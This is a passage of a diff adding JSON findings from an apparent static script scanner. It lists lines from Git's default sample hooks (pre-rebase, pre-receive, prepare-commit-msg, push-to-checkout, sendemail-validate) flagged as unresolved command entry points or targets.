+              "evidence": "\t\t\t\t\tprint STDERR $msg;",
+              "evidenceTruncated": false,
+              "command": "print STDERR $msg"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 82,
+              "evidence": "\t\t\t\t\tundef $msg;",
+              "evidenceTruncated": false,
+              "command": "undef $msg"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 83,
+              "evidence": "\t\t\t\t}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 84,
+              "evidence": "\t\t\t\tprint STDERR \" $elem->[1]\\n\";",
+              "evidenceTruncated": false,
+              "command": "print STDERR \" $elem->[1]/n\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 85,
+              "evidence": "\t\t\t}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 86,
+              "evidence": "\t\t}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 87,
+              "evidence": "\t' \"$topic\" \"$not_in_next\" \"$not_in_master\"",
+              "evidenceTruncated": false,
+              "command": "' \"$topic\" \"$not_in_next\" \"$not_in_master\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 89,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 91,
+              "evidence": "<<\\DOC_END",
+              "evidenceTruncated": false,
+              "command": "<</DOC_END"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 93,
+              "evidence": "This sample hook safeguards topic branches that have been",
+              "evidenceTruncated": false,
+              "command": "This sample hook safeguards topic branches that have been"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 94,
+              "evidence": "published from being rewound.",
+              "evidenceTruncated": false,
+              "command": "published from being rewound."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 96,
+              "evidence": "The workflow assumed here is:",
+              "evidenceTruncated": false,
+              "command": "The workflow assumed here is:"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 98,
+              "evidence": " * Once a topic branch forks from \"master\", \"master\" is never",
+              "evidenceTruncated": false,
+              "command": "* Once a topic branch forks from \"master\", \"master\" is never"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 99,
+              "evidence": "   merged into it again (either directly or indirectly).",
+              "evidenceTruncated": false,
+              "command": "merged into it again (either directly or indirectly)."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 101,
+              "evidence": " * Once a topic branch is fully cooked and merged into \"master\",",
+              "evidenceTruncated": false,
+              "command": "* Once a topic branch is fully cooked and merged into \"master\","
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 102,
+              "evidence": "   it is deleted.  If you need to build on top of it to correct",
+              "evidenceTruncated": false,
+              "command": "it is deleted.  If you need to build on top of it to correct"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 103,
+              "evidence": "   earlier mistakes, a new topic branch is created by forking at",
+              "evidenceTruncated": false,
+              "command": "earlier mistakes, a new topic branch is created by forking at"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 104,
+              "evidence": "   the tip of the \"master\".  This is not strictly necessary, but",
+              "evidenceTruncated": false,
+              "command": "the tip of the \"master\".  This is not strictly necessary, but"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 105,
+              "evidence": "   it makes it easier to keep your history simple.",
+              "evidenceTruncated": false,
+              "command": "it makes it easier to keep your history simple."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 107,
+              "evidence": " * Whenever you need to test or publish your changes to topic",
+              "evidenceTruncated": false,
+              "command": "* Whenever you need to test or publish your changes to topic"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 108,
+              "evidence": "   branches, merge them into \"next\" branch.",
+              "evidenceTruncated": false,
+              "command": "branches, merge them into \"next\" branch."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 110,
+              "evidence": "The script, being an example, hardcodes the publish branch name",
+              "evidenceTruncated": false,
+              "command": "The script, being an example, hardcodes the publish branch name"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 111,
+              "evidence": "to be \"next\", but it is trivial to make it configurable via",
+              "evidenceTruncated": false,
+              "command": "to be \"next\", but it is trivial to make it configurable via"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 112,
+              "evidence": "$GIT_DIR/config mechanism.",
+              "evidenceTruncated": false,
+              "command": "$GIT_DIR/config mechanism."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 114,
+              "evidence": "With this workflow, you would want to know:",
+              "evidenceTruncated": false,
+              "command": "With this workflow, you would want to know:"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 116,
+              "evidence": "(1) ... if a topic branch has ever been merged to \"next\".  Young",
+              "evidenceTruncated": false,
+              "command": "(1) ... if a topic branch has ever been merged to \"next\".  Young"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 117,
+              "evidence": "    topic branches can have stupid mistakes you would rather",
+              "evidenceTruncated": false,
+              "command": "topic branches can have stupid mistakes you would rather"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 118,
+              "evidence": "    clean up before publishing, and things that have not been",
+              "evidenceTruncated": false,
+              "command": "clean up before publishing, and things that have not been"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 119,
+              "evidence": "    merged into other branches can be easily rebased without",
+              "evidenceTruncated": false,
+              "command": "merged into other branches can be easily rebased without"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 120,
+              "evidence": "    affecting other people.  But once it is published, you would",
+              "evidenceTruncated": false,
+              "command": "affecting other people.  But once it is published, you would"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 121,
+              "evidence": "    not want to rewind it.",
+              "evidenceTruncated": false,
+              "command": "not want to rewind it."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 123,
+              "evidence": "(2) ... if a topic branch has been fully merged to \"master\".",
+              "evidenceTruncated": false,
+              "command": "(2) ... if a topic branch has been fully merged to \"master\"."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 124,
+              "evidence": "    Then you can delete it.  More importantly, you should not",
+              "evidenceTruncated": false,
+              "command": "Then you can delete it.  More importantly, you should not"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 125,
+              "evidence": "    build on top of it -- other people may already want to",
+              "evidenceTruncated": false,
+              "command": "build on top of it -- other people may already want to"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 126,
+              "evidence": "    change things related to the topic as patches against your",
+              "evidenceTruncated": false,
+              "command": "change things related to the topic as patches against your"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 127,
+              "evidence": "    \"master\", so if you need further changes, it is better to",
+              "evidenceTruncated": false,
+              "command": "\"master\", so if you need further changes, it is better to"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 128,
+              "evidence": "    fork the topic (perhaps with the same name) afresh from the",
+              "evidenceTruncated": false,
+              "command": "fork the topic (perhaps with the same name) afresh from the"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 129,
+              "evidence": "    tip of \"master\".",
+              "evidenceTruncated": false,
+              "command": "tip of \"master\"."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 131,
+              "evidence": "Let's look at this example:",
+              "evidenceTruncated": false,
+              "command": "Let's look at this example:"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 133,
+              "evidence": "\t\t   o---o---o---o---o---o---o---o---o---o \"next\"",
+              "evidenceTruncated": false,
+              "command": "o---o---o---o---o---o---o---o---o---o \"next\""
+            },
+            {
+              "path": "E:\\",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 134,
+              "evidence": "\t\t  /       /           /           /",
+              "evidenceTruncated": false,
+              "reference": "/",
+              "target": "E:\\",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 135,
+              "evidence": "\t\t /   a---a---b A     /           /",
+              "evidenceTruncated": false,
+              "reference": "/",
+              "target": "E:\\",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 136,
+              "evidence": "\t\t/   /               /           /",
+              "evidenceTruncated": false,
+              "reference": "/",
+              "target": "E:\\",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 137,
+              "evidence": "\t       /   /   c---c---c---c B         /",
+              "evidenceTruncated": false,
+              "reference": "/",
+              "target": "E:\\",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 138,
+              "evidence": "\t      /   /   /             \\         /",
+              "evidenceTruncated": false,
+              "reference": "/",
+              "target": "E:\\",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 139,
+              "evidence": "\t     /   /   /   b---b C     \\       /",
+              "evidenceTruncated": false,
+              "reference": "/",
+              "target": "E:\\",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\",
+              "reason": "Outside supplied scan roots"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Script target could not be inspected",
+              "line": 140,
+              "evidence": "\t    /   /   /   /             \\     /",
+              "evidenceTruncated": false,
+              "reference": "/",
+              "target": "E:\\",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 141,
+              "evidence": "    ---o---o---o---o---o---o---o---o---o---o---o \"master\"",
+              "evidenceTruncated": false,
+              "command": "---o---o---o---o---o---o---o---o---o---o---o \"master\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 144,
+              "evidence": "A, B and C are topic branches.",
+              "evidenceTruncated": false,
+              "command": "A, B and C are topic branches."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 146,
+              "evidence": " * A has one fix since it was merged up to \"next\".",
+              "evidenceTruncated": false,
+              "command": "* A has one fix since it was merged up to \"next\"."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 148,
+              "evidence": " * B has finished.  It has been fully merged up to \"master\" and \"next\",",
+              "evidenceTruncated": false,
+              "command": "* B has finished.  It has been fully merged up to \"master\" and \"next\","
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 149,
+              "evidence": "   and is ready to be deleted.",
+              "evidenceTruncated": false,
+              "command": "and is ready to be deleted."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 151,
+              "evidence": " * C has not merged to \"next\" at all.",
+              "evidenceTruncated": false,
+              "command": "* C has not merged to \"next\" at all."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 153,
+              "evidence": "We would want to allow C to be rebased, refuse A, and encourage",
+              "evidenceTruncated": false,
+              "command": "We would want to allow C to be rebased, refuse A, and encourage"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 154,
+              "evidence": "B to be deleted.",
+              "evidenceTruncated": false,
+              "command": "B to be deleted."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 156,
+              "evidence": "To compute (1):",
+              "evidenceTruncated": false,
+              "command": "To compute (1):"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 158,
+              "evidence": "\tgit rev-list ^master ^topic next",
+              "evidenceTruncated": false,
+              "command": "git rev-list ^master ^topic next"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 159,
+              "evidence": "\tgit rev-list ^master        next",
+              "evidenceTruncated": false,
+              "command": "git rev-list ^master        next"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 161,
+              "evidence": "\tif these match, topic has not merged in next at all.",
+              "evidenceTruncated": false,
+              "command": "if these match, topic has not merged in next at all."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 163,
+              "evidence": "To compute (2):",
+              "evidenceTruncated": false,
+              "command": "To compute (2):"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 165,
+              "evidence": "\tgit rev-list master..topic",
+              "evidenceTruncated": false,
+              "command": "git rev-list master..topic"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 167,
+              "evidence": "\tif this is empty, it is fully merged to \"master\".",
+              "evidenceTruncated": false,
+              "command": "if this is empty, it is fully merged to \"master\"."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-rebase.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 169,
+              "evidence": "DOC_END",
+              "evidenceTruncated": false,
+              "command": "DOC_END"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 9,
+              "evidence": "if test -n \"$GIT_PUSH_OPTION_COUNT\"",
+              "evidenceTruncated": false,
+              "command": "if test -n \"$GIT_PUSH_OPTION_COUNT\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 10,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 11,
+              "evidence": "\ti=0",
+              "evidenceTruncated": false,
+              "command": "i=0"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 12,
+              "evidence": "\twhile test \"$i\" -lt \"$GIT_PUSH_OPTION_COUNT\"",
+              "evidenceTruncated": false,
+              "command": "while test \"$i\" -lt \"$GIT_PUSH_OPTION_COUNT\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 13,
+              "evidence": "\tdo",
+              "evidenceTruncated": false,
+              "command": "do"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 14,
+              "evidence": "\t\teval \"value=\\$GIT_PUSH_OPTION_$i\"",
+              "evidenceTruncated": false,
+              "command": "eval \"value=\\$GIT_PUSH_OPTION_$i\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 15,
+              "evidence": "\t\tcase \"$value\" in",
+              "evidenceTruncated": false,
+              "command": "case \"$value\" in"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 16,
+              "evidence": "\t\techoback=*)",
+              "evidenceTruncated": false,
+              "command": "echoback=*)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 19,
+              "evidence": "\t\treject)",
+              "evidenceTruncated": false,
+              "command": "reject)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 21,
+              "evidence": "\t\tesac",
+              "evidenceTruncated": false,
+              "command": "esac"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 22,
+              "evidence": "\t\ti=$((i + 1))",
+              "evidenceTruncated": false,
+              "command": "+ 1))"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 23,
+              "evidence": "\tdone",
+              "evidenceTruncated": false,
+              "command": "done"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\pre-receive.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 24,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\prepare-commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 23,
+              "evidence": "COMMIT_MSG_FILE=$1",
+              "evidenceTruncated": false,
+              "command": "COMMIT_MSG_FILE=$1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\prepare-commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 24,
+              "evidence": "COMMIT_SOURCE=$2",
+              "evidenceTruncated": false,
+              "command": "COMMIT_SOURCE=$2"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\prepare-commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 25,
+              "evidence": "SHA1=$3",
+              "evidenceTruncated": false,
+              "command": "SHA1=$3"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\prepare-commit-msg.sample",
+              "reason": "Dynamic or remote script target",
+              "line": 27,
+              "evidence": "/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' \"$COMMIT_MSG_FILE\"",
+              "evidenceTruncated": false,
+              "reference": "print unless(m/^. Please enter the commit message/..m/^#$/)",
+              "status": "unresolved"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 21,
+              "evidence": "commit=$1",
+              "evidenceTruncated": false,
+              "command": "commit=$1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 25,
+              "evidence": "die () {",
+              "evidenceTruncated": false,
+              "command": "die () {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 28,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 50,
+              "evidence": "if ! git update-index -q --ignore-submodules --refresh",
+              "evidenceTruncated": false,
+              "command": "if ! git update-index -q --ignore-submodules --refresh"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 51,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 52,
+              "evidence": "\tdie \"Up-to-date check failed\"",
+              "evidenceTruncated": false,
+              "command": "die \"Up-to-date check failed\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 53,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 55,
+              "evidence": "if ! git diff-files --quiet --ignore-submodules --",
+              "evidenceTruncated": false,
+              "command": "if ! git diff-files --quiet --ignore-submodules --"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 56,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 57,
+              "evidence": "\tdie \"Working directory has unstaged changes\"",
+              "evidenceTruncated": false,
+              "command": "die \"Working directory has unstaged changes\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 58,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 63,
+              "evidence": "if git cat-file -e HEAD 2>/dev/null",
+              "evidenceTruncated": false,
+              "command": "if git cat-file -e HEAD 2>/dev/null"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 64,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 65,
+              "evidence": "\thead=HEAD",
+              "evidenceTruncated": false,
+              "command": "head=HEAD"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 66,
+              "evidence": "else",
+              "evidenceTruncated": false,
+              "command": "else"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 67,
+              "evidence": "\thead=$(git hash-object -t tree --stdin </dev/null)",
+              "evidenceTruncated": false,
+              "command": "hash-object -t tree --stdin </dev/null)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 68,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 70,
+              "evidence": "if ! git diff-index --quiet --cached --ignore-submodules $head --",
+              "evidenceTruncated": false,
+              "command": "if ! git diff-index --quiet --cached --ignore-submodules $head --"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 71,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 72,
+              "evidence": "\tdie \"Working directory has staged changes\"",
+              "evidenceTruncated": false,
+              "command": "die \"Working directory has staged changes\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 73,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 75,
+              "evidence": "if ! git read-tree -u -m \"$commit\"",
+              "evidenceTruncated": false,
+              "command": "if ! git read-tree -u -m \"$commit\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 76,
+              "evidence": "then",
+              "evidenceTruncated": false,
+              "command": "then"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 77,
+              "evidence": "\tdie \"Could not update working tree to new HEAD\"",
+              "evidenceTruncated": false,
+              "command": "die \"Could not update working tree to new HEAD\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\push-to-checkout.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 78,
+              "evidence": "fi",
+              "evidenceTruncated": false,
+              "command": "fi"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 25,
+              "evidence": "validate_cover_letter () {",
+              "evidenceTruncated": false,
+              "command": "validate_cover_letter () {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 26,
+              "evidence": "\tfile=\"$1\"",
+              "evidenceTruncated": false,
+              "command": "file=\"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 29,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 31,
+              "evidence": "validate_patch () {",
+              "evidenceTruncated": false,
+              "command": "validate_patch () {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 32,
+              "evidence": "\tfile=\"$1\"",
+              "evidenceTruncated": false,
+              "command": "file=\"$1\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\sendemail-validate.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 34,
+              "evidence": "\tgit am -3 \"$file\" || return",
